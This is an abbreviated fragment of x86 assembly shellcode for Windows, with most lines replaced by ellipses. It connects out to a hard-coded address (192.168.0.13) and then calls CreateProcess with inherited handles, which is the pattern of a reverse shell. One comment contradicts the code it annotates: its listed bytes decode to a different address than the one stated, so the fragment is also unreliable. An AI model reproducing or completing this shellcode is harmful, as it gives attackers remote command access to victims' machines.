...
; ld -m i386pe shellcode.o -o shellcode.exe 
global _start
...
_start:
	...
	; Call connect
	push 0x0d00a8c0		; 0xc0, 0xa8, 0x02, 0x88 = 192.168.0.13
	...
	mov ebx, 0x7c80236b	; CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
	call ebx
